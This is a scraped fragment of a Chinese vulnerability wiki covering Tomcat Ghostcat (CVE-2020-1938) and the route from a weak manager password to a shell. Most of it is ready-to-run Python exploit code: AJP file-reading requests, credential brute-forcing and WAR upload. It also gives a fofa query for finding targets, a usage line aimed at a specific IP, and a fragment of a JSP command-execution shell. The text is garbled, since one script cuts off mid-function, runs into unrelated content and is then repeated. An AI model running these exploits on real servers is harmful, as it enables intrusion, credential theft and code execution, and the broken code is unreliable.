联系方式 作者 : BitWiki支持团队 "},"漏洞文库/Apache/TomCat/CVE-2020-1938 Tomcat  存在AJP 文件包含漏洞.html":{"url":"漏洞文库/Apache/TomCat/CVE-2020-1938 Tomcat  存在AJP 文件包含漏洞.html","title":"CVE 2020 1938 Tomcat  存在AJP 文件包含漏洞","keywords":"","body":"CVE-2020-1938| TomCat 存在AJP 文件包含漏洞 0x00 漏洞说明 Java 是目前 Web 开发中最主流的编程语言，而 Tomcat 是当前最流行的 Java 中间件服务器之一，从初版发布到现在已经有二十多年历史，在世界范围内广泛使用。 Ghostcat（幽灵猫） 是由长亭科技安全研究员发现的存在于 Tomcat 中的安全漏洞，由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。 通过 Ghostcat 漏洞，攻击者可以读取 Tomcat所有 webapp目录下的任意文件。 此外如果网站应用提供文件上传的功能，攻击者可以先向服务端上传一个内容含有恶意 JSP 脚本代码的文件（上传的文件本身可以是任意类型的文件，比如图片、纯文本文件等），然后利用 Ghostcat 漏洞进行文件包含，从而达到代码执行的危害。 0x01 影响版本 Apache Tomcat 9.x Apache Tomcat 8.x Apache Tomcat 7.x Apache Tomcat 6.x 0x02 漏洞成因 tomcat默认的conf/server.xml中配置了2个Connector，一个为8080的对外提供的HTTP协议端口，另外一个就是默认的8009 AJP协议端口，两个端口默认均监听在外网ip tomcat在接收ajp请求的时候调用org.apache.coyote.ajp.AjpProcessor来处理ajp消息，prepareRequest将ajp里面的内容取出来设置成request对象的Attribute属性 由上面的特性，攻击者可控制其他对象，从而造成文件包含 0x03 漏洞代码 https[:]//mp.weixin.qq.com/s/GzqLkwlIQi_i3AVIXn59FQ http[:]//web.archive.org/web/20220313134342/https://mp.weixin.qq.com/s/GzqLkwlIQi_i3AVIXn59FQ 0x04 详细分析 https[:]//mp.weixin.qq.com/s/GzqLkwlIQi_i3AVIXn59FQ http[:]//web.archive.org/web/20220313134342/https://mp.weixin.qq.com/s/GzqLkwlIQi_i3AVIXn59FQ 0x05 漏洞指纹 fofa: app=\"Apache-Tomcat\" 0x06 POC & EXP poc.py #!/usr/bin/env python # # Julien Legras - Synacktiv # # THIS SOFTWARE IS PROVIDED BY SYNACKTIV ''AS IS'' AND ANY # EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED # WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE # DISCLAIMED. IN NO EVENT SHALL SYNACKTIV BE LIABLE FOR ANY # DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES # (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; # LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND # ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT # (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS # SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. from ajpy.ajp import AjpResponse, AjpForwardRequest, AjpBodyRequest, NotFoundException from pprint import pprint, pformat import socket import argparse import logging import re import os from StringIO import StringIO import logging from colorlog import ColoredFormatter from urllib import unquote def setup_logger(): \"\"\"Return a logger with a default ColoredFormatter.\"\"\" formatter = ColoredFormatter( \"[%(asctime)s.%(msecs)03d] %(log_color)s%(levelname)-8s%(reset)s %(white)s%(message)s\", datefmt=\"%Y-%m-%d %H:%M:%S\", reset=True, log_colors={ 'DEBUG': 'bold_purple', 'INFO': 'bold_green', 'WARNING': 'bold_yellow', 'ERROR': 'bold_red', 'CRITICAL': 'bold_red', } ) logger = logging.getLogger('meow') handler = logging.StreamHandler() handler.setFormatter(formatter) logger.addHandler(handler) logger.setLevel(logging.DEBUG) return logger logger = setup_logger() # helpers def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET): fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER) fr.method = method fr.protocol = \"HTTP/1.1\" fr.req_uri = req_uri fr.remote_addr = target_host fr.remote_host = None fr.server_name = target_host fr.server_port = 80 fr.request_headers = { 'SC_REQ_ACCEPT': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'SC_REQ_CONNECTION': 'keep-alive', 'SC_REQ_CONTENT_LENGTH': '0', 'SC_REQ_HOST': target_host, 'SC_REQ_USER_AGENT': 'Mozilla/5.0 (X11; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0', 'Accept-Encoding': 'gzip, deflate, sdch', 'Accept-Language': 'en-US,en;q=0.5', 'Upgrade-Insecure-Requests': '1', 'Cache-Control': 'max-age=0' } fr.is_ssl = False fr.attributes = [] return fr class Tomcat(object): def __init__(self, target_host, target_port): self.target_host = target_host self.target_port = target_port self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) self.socket.connect((target_host, target_port)) self.stream = self.socket.makefile(\"rb\", bufsize=0) def test_password(self, user, password): res = False stop = False self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = \"Basic \" + (\"%s:%s\" % (user, password)).encode( 'base64').replace('\\n', '') while not stop: logger.debug(\"testing %s:%s\" % (user, password)) responses = self.forward_request.send_and_receive(self.socket, self.stream) snd_hdrs_res = responses[0] if snd_hdrs_res.http_status_code == 404: raise NotFoundException(\"The req_uri %s does not exist!\" % self.req_uri) elif snd_hdrs_res.http_status_code == 302: self.req_uri = snd_hdrs_res.response_headers.get('Location', '') logger.info(\"Redirecting to %s\" % self.req_uri) self.forward_request.req_uri = self.req_uri elif snd_hdrs_res.http_status_code == 200: logger.info(\"Found valid credz: %s:%s\" % (user, password)) res = True stop = True if 'Set-Cookie' in snd_hdrs_res.response_headers: logger.info(\"Here is your cookie: %s\" % (snd_hdrs_res.response_headers.get('Set-Cookie', ''))) elif snd_hdrs_res.http_status_code == 403: logger.info(\"Found valid credz: %s:%s but the user is not authorized to access this resource\" % ( user, password)) stop = True elif snd_hdrs_res.http_status_code == 401: stop = True return res def start_bruteforce(self, users, passwords, req_uri, autostop): logger.info(\"Attacking a tomcat at ajp13://%s:%d%s\" % (self.target_host, self.target_port, req_uri)) self.req_uri = req_uri self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri) f_users = open(users, \"r\") f_passwords = open(passwords, \"r\") valid_credz = [] try: for user in f_users: f_passwords.seek(0, 0) for password in f_passwords: if autostop and len(valid_credz) > 0: self.socket.close() return valid_credz user = user.rstrip('\\n') password = password.rstrip('\\n') if self.test_password(user, password): valid_credz.append((user, password)) except NotFoundException as e: logger.fatal(e.message) finally: logger.debug(\"Closing socket...\") self.socket.close() return valid_credz def perform_request(self, req_uri, headers={}, method='GET', user=None, password=None, attributes=[]): self.req_uri = req_uri self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method)) logger.debug(\"Getting resource at ajp13://%s:%d%s\" % (self.target_host, self.target_port, req_uri)) if user is not None and password is not None: self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = \"Basic \" + ( \"%s:%s\" % (user, password)).encode('base64').replace('\\n', '') for h in headers: self.forward_request.request_headers[h] = headers[h] for a in attributes: self.forward_request.attributes.append(a) responses = self.forward_request.send_and_receive(self.socket, self.stream) print(responses) if len(responses) == 0: return None, None snd_hdrs_res = responses[0] data_res = responses[1:-1] if len(data_res) == 0: logger.info(\"No data in response. Headers:\\n %s\" % pformat(vars(snd_hdrs_res))) return snd_hdrs_res, data_res def upload(self, filename, user, password, old_version, headers={}): deploy_csrf_token, obj_cookie = self.get_csrf_token(user, password, old_version, headers) with open(filename, \"rb\") as f_input: with open(\"/tmp/request\", \"w+b\") as f: s_form_header = '------WebKitFormBoundaryb2qpuwMoVtQJENti\\r\\nContent-Disposition: form-data; name=\"deployWar\"; filename=\"%s\"\\r\\nContent-Type: application/octet-stream\\r\\n\\r\\n' % os.path.basename( filename) s_form_footer = '\\r\\n------WebKitFormBoundaryb2qpuwMoVtQJENti--\\r\\n' f.write(s_form_header) f.write(f_input.read()) f.write(s_form_footer) data_len = os.path.getsize(\"/tmp/request\") headers = { \"SC_REQ_CONTENT_TYPE\": \"multipart/form-data; boundary=----WebKitFormBoundaryb2qpuwMoVtQJENti\", \"SC_REQ_CONTENT_LENGTH\": \"%d\" % data_len, \"SC_REQ_REFERER\": \"http://%s/manager/html/\" % (self.target_host), \"Origin\": \"http://%s\" % (self.target_host), } if obj_cookie is not None: headers[\"SC_REQ_COOKIE\"] = obj_cookie.group('cookie') attributes = [{\"name\": \"req_attribute\", \"value\": (\"JK_LB_ACTIVATION\", \"ACT\")}, {\"name\": \"req_attribute\", \"value\": (\"AJP_REMOTE_PORT\", \"12345\")}] if old_version == False: attributes.append({\"name\": \"query_string\", \"value\": deploy_csrf_token}) old_apps = self.list_installed_applications(user, password, old_version) r = self.perform_request(\"/manager/html/upload\", headers=headers, method=\"POST\", user=user, password=password, attributes=attributes) with open(\"/tmp/request\", \"rb\") as f: br = AjpBodyRequest(f, data_len, AjpBodyRequest.SERVER_TO_CONTAINER) br.send_and_receive(self.socket, self.stream) r = AjpResponse.receive(self.stream) if r.prefix_code == AjpResponse.END_RESPONSE: logger.error('Upload failed') while r.prefix_code != AjpResponse.END_RESPONSE: r = AjpResponse.receive(self.stream) logger.debug('Upload seems normal. Checking...') new_apps = self.list_installed_applications(user, password, old_version) if len(new_apps) == len(old_apps) + 1 and new_apps[:-1] == old_apps: logger.info('Upload success!') else: logger.error('Upload failed') def get_error_page(self): return self.perform_request(\"/blablablablabla\") def get_version(self): hdrs, data = self.get_error_page() for d in data: s = re.findall('(Apache Tomcat/[0-9\\.]+) ', d.data) if len(s) > 0: return s[0] def get_csrf_token(self, user, password, old_version, headers={}, query=[]): # first we request the manager page to get the CSRF token hdrs, rdata = self.perform_request(\"/manager/html\", headers=headers, user=user, password=password) deploy_csrf_token = re.findall('(org.apache.catalina.filters.CSRF_NONCE=[0-9A-F]*)\"', \"\".join([d.data for d in rdata])) if old_version == False: if len(deploy_csrf_token) == 0: logger.critical(\"Failed to get CSRF token. Check the credentials\") return logger.debug('CSRF token = %s' % deploy_csrf_token[0]) obj = re.match(\"(?PJSESSIONID=[0-9A-F]*); Path=/manager(/)?; HttpOnly\", hdrs.response_headers.get('Set-Cookie', '')) if obj is not None: return deploy_csrf_token[0], obj return deploy_csrf_token[0], None def list_installed_applications(self, user, password, old_version, headers={}): deploy_csrf_token, obj_cookie = self.get_csrf_token(user, password, old_version, headers) headers = { \"SC_REQ_CONTENT_TYPE\": \"application/x-www-form-urlencoded\", \"SC_REQ_CONTENT_LENGTH\": \"0\", \"SC_REQ_REFERER\": \"http://%s/manager/html/\" % (self.target_host), \"Origin\": \"http://%s\" % (self.target_host), } if obj_cookie is not None: headers[\"SC_REQ_COOKIE\"] = obj_cookie.group('cookie') attributes = [{\"name\": \"req_attribute\", \"value\": (\"JK_LB_ACTIVATION\", \"ACT\")}, {\"name\": \"req_attribute\", \"value\": (\"AJP_REMOTE_PORT\", \"{}\".format(self.socket.getsockname()[1]))}] if old_version == False: attributes.append({ \"name\": \"query_string\", \"value\": \"%s\" % deploy_csrf_token}) hdrs, data = self.perform_request(\"/manager/html/\", headers=headers, method=\"GET\", user=user, password=password, attributes=attributes) found = [] for d in data: im = re.findall('/manager/html/expire\\?path=([^&]*)&', d.data) for app in im: found.append(unquote(app)) return found def undeploy(self, path, user, password, old_version, headers={}): deploy_csrf_token, obj_cookie = self.get_csrf_token(user, password, old_version, headers) path_app = \"path=%s\" % path headers = { \"SC_REQ_CONTENT_TYPE\": \"application/x-www-form-urlencoded\", \"SC_REQ_CONTENT_LENGTH\": \"0\", \"SC_REQ_REFERER\": \"http://%s/manager/html/\" % (self.target_host), \"Origin\": \"http://%s\" % (self.target_host), } if obj_cookie is not None: headers[\"SC_REQ_COOKIE\"] = obj_cookie.group('cookie') attributes = [{\"name\": \"req_attribute\", \"value\": (\"JK_LB_ACTIVATION\", \"ACT\")}, {\"name\": \"req_attribute\", \"value\": (\"AJP_REMOTE_PORT\", \"{}\".format(self.socket.getsockname()[1]))}] if old_version == False: attributes.append({ \"name\": \"query_string\", \"value\": \"%s&%s\" % (path_app, deploy_csrf_token)}) r = self.perform_request(\"/manager/html/undeploy\", headers=headers, method=\"POST\", user=user, password=password, attributes=attributes) r = AjpResponse.receive(self.stream) if r.prefix_code == AjpResponse.END_RESPONSE: logger.error('Undeploy failed') # Check the successful message found = False regex = r'Message:&nbsp;\\s*(OK - .*' + path + ')\\s*' while r.prefix_code != AjpResponse.END_RESPONSE: r = AjpResponse.receive(self.stream) if r.prefix_code == 3: f = re.findall(regex, r.data) if len(f) > 0: found = True if found: logger.info('Undeploy succeed') else: logger.error('Undeploy failed') if __name__ == \"__main__\": parser = argparse.ArgumentParser() parser.add_argument('target', type=str, help=\"Hostname or IP to attack\") parser.add_argument('-p', '--port', type=int, default=8009, help=\"AJP port to attack (default is 8009)\") parser.add_argument(\"-f\", '--file', type=str, default='WEB-INF/web.xml', help=\"file path :(WEB-INF/web.xml)\") args = parser.parse_args() bf = Tomcat(args.target, args.port) attributes = [ {'name': 'req_attribute', 'value': ['javax.servlet.include.request_uri', '/']}, {'name': 'req_attribute', 'value': ['javax.servlet.include.path_info', args.file]}, {'name': 'req_attribute', 'value': ['javax.servlet.include.servlet_path', '/']}, ] snd_hdrs_res, data_res = bf.perform_request(req_uri='/',method='GET', attributes=attributes) print(\"\".join([d.data for d in data_res])) exp.py #!/usr/bin/python3 # Author: 00theway import socket import binascii import argparse import urllib.parse debug = False def log(type, *args, **kwargs): if type == 'debug' and debug == False: return elif type == 'append' and debug == True: return elif type == 'append': kwargs['end'] = '' print(*args, **kwargs) return print('[%s]' % type.upper(), *args, **kwargs) class ajpRequest(object): def __init__(self, request_url, method='GET', headers=[], attributes=[]): self.request_url = request_url self.method = method self.headers = headers self.attributes = attributes def method2code(self, method): methods = { 'OPTIONS': 1, 'GET': 2, 'HEAD': 3, 'POST': 4, 'PUT': 5, 'DELETE': 6, 'TRACE': 7, 'PROPFIND': 8 } code = methods.get(method, 2) return code def make_headers(self): header2code = { b'accept': b'\\xA0\\x01', # SC_REQ_ACCEPT b'accept-charset': b'\\xA0\\x02', # SC_REQ_ACCEPT_CHARSET b'accept-encoding': b'\\xA0\\x03', # SC_REQ_ACCEPT_ENCODING b'accept-language': b'\\xA0\\x04', # SC_REQ_ACCEPT_LANGUAGE b'authorization': b'\\xA0\\x05', # SC_REQ_AUTHORIZATION b'connection': b'\\xA0\\x06', # SC_REQ_CONNECTION b'content-type': b'\\xA0\\x07', # SC_REQ_CONTENT_TYPE b'content-length': b'\\xA0\\x08', # SC_REQ_CONTENT_LENGTH b'cookie': b'\\xA0\\x09', # SC_REQ_COOKIE b'cookie2': b'\\xA0\\x0A', # SC_REQ_COOKIE2 b'host': b'\\xA0\\x0B', # SC_REQ_HOST b'pragma': b'\\xA0\\x0C', # SC_REQ_PRAGMA b'referer': b'\\xA0\\x0D', # SC_REQ_REFERER b'user-agent': b'\\xA0\\x0E' # SC_REQ_USER_AGENT } headers_ajp = [] for (header_name, header_value) in self.headers: code = header2code.get(header_name, b'') if code != b'': headers_ajp.append(code) headers_ajp.append(self.ajp_string(header_value)) else: headers_ajp.append(self.ajp_string(header_name)) headers_ajp.append(self.ajp_string(header_value)) return self.int2byte(len(self.headers), 2), b''.join(headers_ajp) def make_attributes(self): ''' org.apache.catalina.jsp_file javax.servlet.include.servlet_path + javax.servlet.include.path_info ''' attribute2code = { b'remote_user': b'\\x03', b'auth_type': b'\\x04', b'query_string': b'\\x05', b'jvm_route': b'\\x06', b'ssl_cert': b'\\x07', b'ssl_cipher': b'\\x08', b'ssl_session': b'\\x09', b'req_attribute': b'\\x0A', # Name (the name of the attribut follows) b'ssl_key_size': b'\\x0B' } attributes_ajp = [] for (name, value) in self.attributes: code = attribute2code.get(name, b'') if code != b'': attributes_ajp.append(code) if code == b'\\x0A': for v in value: attributes_ajp.append(self.ajp_string(v)) else: attributes_ajp.append(self.ajp_string(value)) return b''.join(attributes_ajp) def ajp_string(self, message_bytes): # an AJP string # the length of the string on two bytes + string + plus two null bytes message_len_int = len(message_bytes) return self.int2byte(message_len_int, 2) + message_bytes + b'\\x00' def int2byte(self, data, byte_len=1): return data.to_bytes(byte_len, 'big') def make_forward_request_package(self): ''' AJP13_FORWARD_REQUEST := prefix_code (byte) 0x02 = JK_AJP13_FORWARD_REQUEST method (byte) protocol (string) req_uri (string) remote_addr (string) remote_host (string) server_name (string) server_port (integer) is_ssl (boolean) num_headers (integer) request_headers *(req_header_name req_header_value) attributes *(attribut_name attribute_value) request_terminator (byte) OxFF ''' req_ob = urllib.parse.urlparse(self.request_url) # JK_AJP13_FORWARD_REQUEST prefix_code_int = 2 prefix_code_bytes = self.int2byte(prefix_code_int) method_bytes = self.int2byte(self.method2code(self.method)) protocol_bytes = b'HTTP/1.1' req_uri_bytes = req_ob.path.encode('utf8') remote_addr_bytes = b'127.0.0.1' remote_host_bytes = b'localhost' server_name_bytes = req_ob.hostname.encode('utf8') # SSL flag if req_ob.scheme == 'https': is_ssl_boolean = 1 else: is_ssl_boolean = 0 # port server_port_int = req_ob.port if not server_port_int: server_port_int = (is_ssl_boolean ^ 1) * 80 + (is_ssl_boolean ^ 0) * 443 server_port_bytes = self.int2byte(server_port_int, 2) # convert to a two bytes is_ssl_bytes = self.int2byte(is_ssl_boolean) # convert to a one byte self.headers.append((b'host', b'%s:%d' % (server_name_bytes, server_port_int))) num_headers_bytes, headers_ajp_bytes = self.make_headers() attributes_ajp_bytes = self.make_attributes() message = [] message.append(prefix_code_bytes) message.append(method_bytes) message.append(self.ajp_string(protocol_bytes)) message.append(self.ajp_string(req_uri_bytes)) message.append(self.ajp_string(remote_addr_bytes)) message.append(self.ajp_string(remote_host_bytes)) message.append(self.ajp_string(server_name_bytes)) message.append(server_port_bytes) message.append(is_ssl_bytes) message.append(num_headers_bytes) message.append(headers_ajp_bytes) message.append(attributes_ajp_bytes) message.append(b'\\xff') message_bytes = b''.join(message) send_bytes = b'\\x12\\x34' + self.ajp_string(message_bytes) return send_bytes class ajpResponse(object): def __init__(self, s, out_file): self.sock = s self.out_file = out_file self.body_start = False self.common_response_headers = { b'\\x01': b'Content-Type', b'\\x02': b'Content-Language', b'\\x03': b'Content-Length', b'\\x04': b'Date', b'\\x05': b'Last-Modified', b'\\x06': b'Location', b'\\x07': b'Set-Cookie', b'\\x08': b'Set-Cookie2', b'\\x09': b'Servlet-Engine', b'\\x0a': b'Status', b'\\x0b': b'WWW-Authenticate', } if not self.out_file: self.out_file = False else: log('*', 'store response in %s' % self.out_file) self.out = open(self.out_file, 'wb') def parse_response(self): log('debug', 'start') magic = self.recv(2) # first two bytes are the 'magic' log('debug', 'magic', magic, binascii.b2a_hex(magic)) # next two bytes are the length data_len_int = self.read_int(2) code_int = self.read_int(1) log('debug', 'code', code_int) if code_int == 3: self.parse_send_body_chunk() elif code_int == 4: self.parse_headers() elif code_int == 5: self.parse_response_end() quit() self.parse_response() def parse_headers(self): log(\"append\", '\\n') log('debug', 'parsing RESPONSE HEADERS') status_int = self.read_int(2) msg_bytes = self.read_string() log(' 0x07 进阶利用思路 利用条件较为苛刻，需要同时存在该漏洞和文件上传，构造一个恶意jsp代码的任意文件，上传至目录，使用脚本执行即可 \").getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\"\"); while((a=in.read(b)) != -1){ out.println(new String(b)); } out.print(\"\"); %> python3 CVE-2020-1938.py http://123.58.236.76:30776 18797 favicon.ico read 0x08 扩展链接 此段落主要撰写扩展阅读链接，以及详细分析该漏洞的文章等 Apache Httpd Cve 2021 41773 And Cve 2021 42013 漏洞详细分析 0x9 联系方式 作者 : BitWiki支持团队 "},"漏洞文库/Apache/TomCat/Tomcat 管理后台弱口令导致的文件上传GetShell.html":{"url":"漏洞文库/Apache/TomCat/Tomcat 管理后台弱口令导致的文件上传GetShell.html","title":"Tomcat 管理后台弱口令导致的文件上传GetShell","keywords":"","body":"Tomcat 管理后台弱口令导致的文件上传GetShell 0x00 漏洞说明 Java 是目前 Web 开发中最主流的编程语言，而 Tomcat 是当前最流行的 Java 中间件服务器之一，从初版发布到现在已经有二十多年历史，在世界范围内广泛使用。 若是Tomcat管理后台存在弱口令，则可以进入后台上传部署war包 geshell 0x01 影响版本 全版本 0x02 漏洞成因 后台密码为弱口令 管理页面未设置访控 0x03 漏洞代码 http:///manager/html 0x04 详细分析 https[:]//mp.weixin.qq.com/s/GzqLkwlIQi_i3AVIXn59FQ http[:]//web.archive.org/web/20220313134342/https://mp.weixin.qq.com/s/GzqLkwlIQi_i3AVIXn59FQ 0x05 漏洞指纹 fofa: app=\"Apache-Tomcat\" 0x06 POC & EXP poc.py #!/usr/bin/env python # # Julien Legras - Synacktiv # # THIS SOFTWARE IS PROVIDED BY SYNACKTIV ''AS IS'' AND ANY # EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED # WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE # DISCLAIMED. IN NO EVENT SHALL SYNACKTIV BE LIABLE FOR ANY # DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES # (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; # LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND # ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT # (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS # SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. from ajpy.ajp import AjpResponse, AjpForwardRequest, AjpBodyRequest, NotFoundException from pprint import pprint, pformat import socket import argparse import logging import re import os from StringIO import StringIO import logging from colorlog import ColoredFormatter from urllib import unquote def setup_logger(): \"\"\"Return a logger with a default ColoredFormatter.\"\"\" formatter = ColoredFormatter( \"[%(asctime)s.%(msecs)03d] %(log_color)s%(levelname)-8s%(reset)s %(white)s%(message)s\", datefmt=\"%Y-%m-%d %H:%M:%S\", reset=True, log_colors={ 'DEBUG': 'bold_purple', 'INFO': 'bold_green', 'WARNING': 'bold_yellow', 'ERROR': 'bold_red', 'CRITICAL': 'bold_red', } ) logger = logging.getLogger('meow') handler = logging.StreamHandler() handler.setFormatter(formatter) logger.addHandler(handler) logger.setLevel(logging.DEBUG) return logger logger = setup_logger() # helpers def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET): fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER) fr.method = method fr.protocol = \"HTTP/1.1\" fr.req_uri = req_uri fr.remote_addr = target_host fr.remote_host = None fr.server_name = target_host fr.server_port = 80 fr.request_headers = { 'SC_REQ_ACCEPT': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'SC_REQ_CONNECTION': 'keep-alive', 'SC_REQ_CONTENT_LENGTH': '0', 'SC_REQ_HOST': target_host, 'SC_REQ_USER_AGENT': 'Mozilla/5.0 (X11; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0', 'Accept-Encoding': 'gzip, deflate, sdch', 'Accept-Language': 'en-US,en;q=0.5', 'Upgrade-Insecure-Requests': '1', 'Cache-Control': 'max-age=0' } fr.is_ssl = False fr.attributes = [] return fr class Tomcat(object): def __init__(self, target_host, target_port): self.target_host = target_host self.target_port = target_port self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) self.socket.connect((target_host, target_port)) self.stream = self.socket.makefile(\"rb\", bufsize=0) def test_password(self, user, password): res = False stop = False self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = \"Basic \" + (\"%s:%s\" % (user, password)).encode( 'base64').replace('\\n', '') while not stop: logger.debug(\"testing %s:%s\" % (user, password)) responses = self.forward_request.send_and_receive(self.socket, self.stream) snd_hdrs_res = responses[0] if snd_hdrs_res.http_status_code == 404: raise NotFoundException(\"The req_uri %s does not exist!\" % self.req_uri) elif snd_hdrs_res.http_status_code == 302: self.req_uri = snd_hdrs_res.response_headers.get('Location', '') logger.info(\"Redirecting to %s\" % self.req_uri) self.forward_request.req_uri = self.req_uri elif snd_hdrs_res.http_status_code == 200: logger.info(\"Found valid credz: %s:%s\" % (user, password)) res = True stop = True if 'Set-Cookie' in snd_hdrs_res.response_headers: logger.info(\"Here is your cookie: %s\" % (snd_hdrs_res.response_headers.get('Set-Cookie', ''))) elif snd_hdrs_res.http_status_code == 403: logger.info(\"Found valid credz: %s:%s but the user is not authorized to access this resource\" % ( user, password)) stop = True elif snd_hdrs_res.http_status_code == 401: stop = True return res def start_bruteforce(self, users, passwords, req_uri, autostop): logger.info(\"Attacking a tomcat at ajp13://%s:%d%s\" % (self.target_host, self.target_port, req_uri)) self.req_uri = req_uri self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri) f_users = open(users, \"r\") f_passwords = open(passwords, \"r\") valid_credz = [] try: for user in f_users: f_passwords.seek(0, 0) for password in f_passwords: if autostop and len(valid_credz) > 0: self.socket.close() return valid_credz user = user.rstrip('\\n') password = password.rstrip('\\n') if self.test_password(user, password): valid_credz.append((user, password)) except NotFoundException as e: logger.fatal(e.message) finally: logger.debug(\"Closing socket...\") self.socket.close() return valid_credz def perform_request(self, req_uri, headers={}, method='GET', user=None, password=None, attributes=[]): self.req_uri = req_uri self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method)) logger.debug(\"Getting resource at ajp13://%s:%d%s\" % (self.target_host, self.target_port, req_uri)) if user is not None and password is not None: self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = \"Basic \" + ( \"%s:%s\" % (user, password)).encode('base64').replace('\\n', '') for h in headers: self.forward_request.request_headers[h] = headers[h] for a in attributes: self.forward_request.attributes.append(a) responses = self.forward_request.send_and_receive(self.socket, self.stream) print(responses) if len(responses) == 0: return None, None snd_hdrs_res = responses[0] data_res = responses[1:-1] if len(data_res) == 0: logger.info(\"No data in response. Headers:\\n %s\" % pformat(vars(snd_hdrs_res))) return snd_hdrs_res, data_res def upload(self, filename, user, password, old_version, headers={}): deploy_csrf_token, obj_cookie = self.get_csrf_token(user, password, old_version, headers) with open(filename, \"rb\") as f_input: with open(\"/tmp/request\", \"w+b\") as f: s_form_header = '------WebKitFormBoundaryb2qpuwMoVtQJENti\\r\\nContent-Disposition: form-data; name=\"deployWar\"; filename=\"%s\"\\r\\nContent-Type: application/octet-stream\\r\\n\\r\\n' % os.path.basename( filename) s_form_footer = '\\r\\n------WebKitFormBoundaryb2qpuwMoVtQJENti--\\r\\n' f.write(s_form_header) f.write(f_input.read()) f.write(s_form_footer) data_len = os.path.getsize(\"/tmp/request\") headers = { \"SC_REQ_CONTENT_TYPE\": \"multipart/form-data; boundary=----WebKitFormBoundaryb2qpuwMoVtQJENti\", \"SC_REQ_CONTENT_LENGTH\": \"%d\" % data_len, \"SC_REQ_REFERER\": \"http://%s/manager/html/\" % (self.target_host), \"Origin\": \"http://%s\" % (self.target_host), } if obj_cookie is not None: headers[\"SC_REQ_COOKIE\"] = obj_cookie.group('cookie') attributes = [{\"name\": \"req_attribute\", \"value\": (\"JK_LB_ACTIVATION\", \"ACT\")}, {\"name\": \"req_attribute\", \"value\": (\"AJP_REMOTE_PORT\", \"12345\")}] if old_version == False: attributes.append({\"name\": \"query_string\", \"value\": deploy_csrf_token}) old_apps = self.list_installed_applications(user, password, old_version) r = self.perform_request(\"/manager/html/upload\", headers=headers, method=\"POST\", user=user, password=password, attributes=attributes) with open(\"/tmp/request\", \"rb\") as f: br = AjpBodyRequest(f, data_len, AjpBodyRequest.SERVER_TO_CONTAINER) br.send_and_receive(self.socket, self.stream) r = AjpResponse.receive(self.stream) if r.prefix_code == AjpResponse.END_RESPONSE: logger.error('Upload failed') while r.prefix_code != AjpResponse.END_RESPONSE: r = AjpResponse.receive(self.stream) logger.debug('Upload seems normal. Checking...') new_apps = self.list_installed_applications(user, password, old_version) if len(new_apps) == len(old_apps) + 1 and new_apps[:-1] == old_apps: logger.info('Upload success!') else: logger.error('Upload failed') def get_error_page(self): return self.perform_request(\"/blablablablabla\") def get_version(self): hdrs, data = self.get_error_page() for d in data: s = re.findall('(Apache Tomcat/[0-9\\.]+) ', d.data) if len(s) > 0: return s[0] def get_csrf_token(self, user, password, old_version, headers={}, query=[]): # first we request the manager page to get the CSRF token hdrs, rdata = self.perform_request(\"/manager/html\", headers=headers, user=user, password=password) deploy_csrf_token = re.findall('(org.apache.catalina.filters.CSRF_NONCE=[0-9A-F]*)\"', \"\".join([d.data for d in rdata])) if old_version == False: if len(deploy_csrf_token) == 0: logger.critical(\"Failed to get CSRF token. Check the credentials\") return logger.debug('CSRF token = %s' % deploy_csrf_token[0]) obj = re.match(\"(?PJSESSIONID=[0-9A-F]*); Path=/manager(/)?; HttpOnly\", hdrs.response_headers.get('Set-Cookie', '')) if obj is not None: return deploy_csrf_token[0], obj 